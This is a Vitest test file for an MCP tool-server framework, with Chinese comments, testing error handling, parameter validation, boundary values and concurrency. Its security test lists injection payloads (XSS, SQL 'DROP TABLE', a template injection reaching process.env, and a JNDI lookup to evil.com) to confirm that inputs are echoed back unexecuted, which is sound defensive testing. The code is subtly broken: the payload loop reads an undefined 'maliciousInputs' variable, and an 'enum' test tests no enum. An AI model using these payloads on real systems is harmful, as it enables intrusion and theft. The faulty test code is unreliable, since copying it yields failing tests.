import { beforeEach, describe, expect, it, vi } from "vitest";
import "reflect-metadata";
import { z } from "zod";
import { applyTestMocks } from "../../../test-types.js";
import { Param, Tool } from "../../src/core/decorators.js";
import { ToolNotFoundError, ToolValidationError } from "../../src/core/errors.js";
import { BestMCP } from "../../src/core/server.js";

// Mock console methods to avoid noise in tests
const consoleSpy = vi.spyOn(console, "log").mockImplementation(() => {});
const consoleErrorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

// 错误测试服务类
class ErrorTestService {
  @Tool("正常工具")
  normalTool(@Param(z.string(), "参数") param: string): string {
    return param;
  }

  @Tool("抛出错误工具")
  throwError(@Param(z.string(), "参数") param: string): never {
    throw new Error(`测试错误: ${param}`);
  }

  @Tool("异步错误工具")
  async asyncError(@Param(z.string(), "参数") param: string): Promise<string> {
    throw new Error(`异步错误: ${param}`);
  }

  @Tool("类型错误工具")
  typeError(@Param(z.string(), "参数") param: string): string {
    // 故意返回错误类型
    // @ts-expect-error - 测试类型错误处理
    return param as unknown as string;
  }

  @Tool("边界测试工具")
  boundaryTest(@Param(z.number().min(0).max(100), "数值") value: number): number {
    return value * 2;
  }
}

class ComplexParameterService {
  @Tool("复杂对象参数")
  complexObject(
    @Param(
      z.object({
        user: z.object({
          name: z.string(),
          age: z.number().min(0),
          email: z.string().email().optional(),
        }),
        settings: z.object({
          theme: z.enum(["light", "dark"]),
          notifications: z.boolean(),
        }),
      }),
      "复杂参数",
    )
    params: {
      user: { name: string; age: number; email?: string };
      settings: { theme: "light" | "dark"; notifications: boolean };
    },
  ): string {
    return `处理用户: ${params.user.name}`;
  }

  @Tool("数组参数工具")
  arrayTool(
    @Param(z.array(z.string()), "字符串数组") items: string[],
    @Param(z.number().optional(), "乘数") multiplier?: number,
  ): number {
    return items.length * (multiplier || 1);
  }

  @Tool("嵌套参数工具")
  nestedParams(
    @Param(
      z.object({
        level1: z.object({
          level2: z.object({
            value: z.string(),
            count: z.number(),
          }),
        }),
      }),
      "嵌套参数",
    )
    data: {
      level1: {
        level2: {
          value: string;
          count: number;
        };
      };
    },
  ): string {
    return `${data.level1.level2.value} x ${data.level1.level2.count}`;
  }
}

describe("错误处理和边界条件测试", () => {
  let mcp: BestMCP;

  beforeEach(() => {
    mcp = new BestMCP("error-test", "1.0.0");
    mcp.register(ErrorTestService);
    mcp.register(ComplexParameterService);
    consoleSpy.mockClear();
    consoleErrorSpy.mockClear();
  });

  describe("工具不存在错误", () => {
    it("应该抛出 ToolNotFoundError", async () => {
      await expect(mcp.executeTool("nonexistent", {})).rejects.toThrow(ToolNotFoundError);
    });

    it("应该提供详细的错误信息", async () => {
      try {
        await mcp.executeTool("nonexistentTool", {});
      } catch (error) {
        expect(error).toBeInstanceOf(ToolNotFoundError);
        expect((error as ToolNotFoundError).message).toContain("未找到工具 nonexistentTool");
      }
    });

    it("应该处理空工具名", async () => {
      await expect(mcp.executeTool("", {})).rejects.toThrow(ToolNotFoundError);
    });

    it("应该处理特殊字符工具名", async () => {
      await expect(mcp.executeTool("!@#$%^&*()", {})).rejects.toThrow(ToolNotFoundError);
    });
  });

  describe("参数验证错误", () => {
    it("应该检测缺失的必需参数", async () => {
      await expect(mcp.executeTool("normalTool", {})).rejects.toThrow(ToolValidationError);
    });

    it("应该检测类型错误", async () => {
      await expect(mcp.executeTool("normalTool", { param: 123 })).rejects.toThrow(ToolValidationError);
    });

    it("应该检测无效的枚举值", async () => {
      await expect(mcp.executeTool("normalTool", { param: "valid" })).resolves.toBe("valid");

      // 这个测试验证了类型检查正常工作
      const result = await mcp.executeTool("normalTool", { param: "test" });
      expect(result).toBe("test");
    });

    it("应该处理 null 和 undefined 参数", async () => {
      await expect(mcp.executeTool("normalTool", { param: null })).rejects.toThrow(ToolValidationError);

      await expect(mcp.executeTool("normalTool", { param: undefined })).rejects.toThrow(ToolValidationError);
    });
  });

  describe("复杂参数验证", () => {
    it("应该验证嵌套对象参数", async () => {
      const validParams = {
        level1: {
          level2: {
            value: "test",
            count: 5,
          },
        },
      };

      const result = await mcp.executeTool("nestedParams", validParams);
      expect(result).toBe("test x 5");
    });

    it("应该检测嵌套对象中的错误", async () => {
      const invalidParams = {
        level1: {
          level2: {
            value: 123, // 错误：应该是字符串
            count: 5,
          },
        },
      };

      await expect(mcp.executeTool("nestedParams", invalidParams)).rejects.toThrow(ToolValidationError);
    });

    it("应该验证数组参数", async () => {
      const validParams = {
        items: ["a", "b", "c"],
        multiplier: 2,
      };

      const result = await mcp.executeTool("arrayTool", validParams);
      expect(result).toBe(6);
    });

    it("应该检测数组中的错误类型", async () => {
      const invalidParams = {
        items: ["a", 123, "c"], // 包含数字
        multiplier: 2,
      };

      await expect(mcp.executeTool("arrayTool", invalidParams)).rejects.toThrow(ToolValidationError);
    });

    it("应该处理空数组", async () => {
      const emptyArrayParams = {
        items: [],
        multiplier: 5,
      };

      const result = await mcp.executeTool("arrayTool", emptyArrayParams);
      expect(result).toBe(0);
    });
  });

  describe("边界值测试", () => {
    it("应该处理数值边界", async () => {
      // 测试最小值
      const result1 = await mcp.executeTool("boundaryTest", { value: 0 });
      expect(result1).toBe(0);

      // 测试最大值
      const result2 = await mcp.executeTool("boundaryTest", { value: 100 });
      expect(result2).toBe(200);

      // 测试超出范围
      await expect(mcp.executeTool("boundaryTest", { value: -1 })).rejects.toThrow(ToolValidationError);

      await expect(mcp.executeTool("boundaryTest", { value: 101 })).rejects.toThrow(ToolValidationError);
    });

    it("应该处理极大数值", async () => {
      const largeNumber = Number.MAX_SAFE_INTEGER;
      await expect(mcp.executeTool("boundaryTest", { value: largeNumber })).rejects.toThrow(ToolValidationError);
    });

    it("应该处理极小数值", async () => {
      const smallNumber = Number.MIN_SAFE_INTEGER;
      await expect(mcp.executeTool("boundaryTest", { value: smallNumber })).rejects.toThrow(ToolValidationError);
    });
  });

  describe("字符串边界测试", () => {
    it("应该处理空字符串", async () => {
      const result = await mcp.executeTool("normalTool", { param: "" });
      expect(result).toBe("");
    });

    it("应该处理非常长的字符串", async () => {
      const longString = "a".repeat(10000);
      const result = await mcp.executeTool("normalTool", { param: longString });
      expect(result).toBe(longString);
    });

    it("应该处理包含特殊字符的字符串", async () => {
      const specialString = "!@#$%^&*(){}[]|\\:;\"'<>?,./";
      const result = await mcp.executeTool("normalTool", { param: specialString });
      expect(result).toBe(specialString);
    });

    it("应该处理 Unicode 字符串", async () => {
      const unicodeString = "你好世界 🌍 emojis 🎉";
      const result = await mcp.executeTool("normalTool", { param: unicodeString });
      expect(result).toBe(unicodeString);
    });
  });

  describe("运行时错误处理", () => {
    it("应该处理同步工具抛出的错误", async () => {
      await expect(mcp.executeTool("throwError", { param: "test" })).rejects.toThrow("测试错误: test");
    });

    it("应该处理异步工具抛出的错误", async () => {
      await expect(mcp.executeTool("asyncError", { param: "async" })).rejects.toThrow("异步错误: async");
    });

    it("应该优雅地处理未捕获的异常", async () => {
      // 这个测试验证系统能处理各种异常情况
      try {
        await mcp.executeTool("throwError", { param: "unexpected" });
      } catch (error) {
        expect(error).toBeInstanceOf(Error);
      }
    });
  });

  describe("内存边界测试", () => {
    it("应该处理大量并发请求", async () => {
      const _mocks = applyTestMocks(mcp, vi);

      await mcp.run({ transport: "stdio" });

      const promises = [];
      for (let i = 0; i < 100; i++) {
        promises.push(mcp.executeTool("normalTool", { param: `test-${i}` }));
      }

      const results = await Promise.all(promises);
      expect(results).toHaveLength(100);

      // 验证结果正确性
      results.forEach((result, index) => {
        expect(result).toBe(`test-${index}`);
      });
    });

    it("应该在大对象参数下正常工作", async () => {
      const largeObject = {
        data: new Array(1000).fill(0).map((_, i) => ({
          id: i,
          name: `item-${i}`,
          description: `This is item number ${i} with some additional text to make it longer`,
        })),
      };

      // 这个测试主要验证系统不会因为大对象而崩溃
      // 由于我们的工具不接受这种参数，预期会抛出验证错误
      await expect(mcp.executeTool("normalTool", { param: largeObject })).rejects.toThrow(ToolValidationError);
    });
  });

  describe("状态一致性测试", () => {
    it("应该在错误后保持服务器状态", async () => {
      const _mocks = applyTestMocks(mcp, vi);

      await mcp.run({ transport: "stdio" });

      // 执行一些成功的操作
      const result1 = await mcp.executeTool("normalTool", { param: "success1" });
      expect(result1).toBe("success1");

      // 执行一个会失败的操作
      try {
        await mcp.executeTool("throwError", { param: "error" });
      } catch (_error) {
        // 预期的错误
      }

      // 验证服务器仍然正常工作
      const result2 = await mcp.executeTool("normalTool", { param: "success2" });
      expect(result2).toBe("success2");

      // 验证状态
      expect(mcp.isServerRunning()).toBe(true);
      expect(mcp.getToolStats().totalTools).toBeGreaterThan(0);
    });

    it("应该在多次错误后保持稳定", async () => {
      const _mocks = applyTestMocks(mcp, vi);

      await mcp.run({ transport: "stdio" });

      // 连续执行多个错误操作
      for (let i = 0; i < 10; i++) {
        try {
          await mcp.executeTool("nonexistent", {});
        } catch (_error) {
          // 预期的错误
        }
      }

      // 验证服务器仍然正常工作
      const result = await mcp.executeTool("normalTool", { param: "stable" });
      expect(result).toBe("stable");
    });
  });

  describe("配置边界测试", () => {
    it("应该处理极端的配置值", async () => {
      const _mocks = applyTestMocks(mcp, vi);

      // 测试极端端口号
      await expect(mcp.run({ transport: "http", port: 0 })).rejects.toThrow();

      await expect(mcp.run({ transport: "http", port: 65536 })).rejects.toThrow();

      // 测试极端主机名
      await expect(mcp.run({ transport: "http", host: "" })).rejects.toThrow();
    });
  });

  describe("输入清理和安全测试", () => {
    it("应该安全处理恶意输入", async () => {
      const _maliciousInputs = [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "\0\x00\x00\x00",
        "{{constructor.constructor('return process')().env}}",
        "$" + "{jndi:ldap://evil.com/a}",
      ];

      for (const input of maliciousInputs) {
        const result = await mcp.executeTool("normalTool", { param: input });
        // 结果应该与输入完全相同，不做任何解释或执行
        expect(result).toBe(input);
      }
    });

    it("应该处理控制字符", async () => {
      const controlChars = "\n\r\t\b\f\v";
      const result = await mcp.executeTool("normalTool", { param: controlChars });
      expect(result).toBe(controlChars);
    });
  });

  describe("并发错误处理", () => {
    it("应该正确处理并发中的混合成功和失败", async () => {
      const _mocks = applyTestMocks(mcp, vi);

      await mcp.run({ transport: "stdio" });

      const promises = [];

      // 混合成功和失败的请求
      for (let i = 0; i < 20; i++) {
        if (i % 3 === 0) {
          // 成功的请求
          promises.push(mcp.executeTool("normalTool", { param: `success-${i}` }));
        } else if (i % 3 === 1) {
          // 不存在的工具
          promises.push(mcp.executeTool("nonexistent", {}).catch(() => "error"));
        } else {
          // 参数错误
          promises.push(mcp.executeTool("normalTool", { param: 123 }).catch(() => "error"));
        }
      }

      const results = await Promise.all(promises);

      // 验证成功的请求都返回了正确结果
      const successResults = results.filter((r) => r !== "error");
      expect(successResults).toHaveLength(7); // 20个中应该有7个成功

      successResults.forEach((result, _index) => {
        expect(result).toMatch(/^success-\d+$/);
      });
    });
  });
});
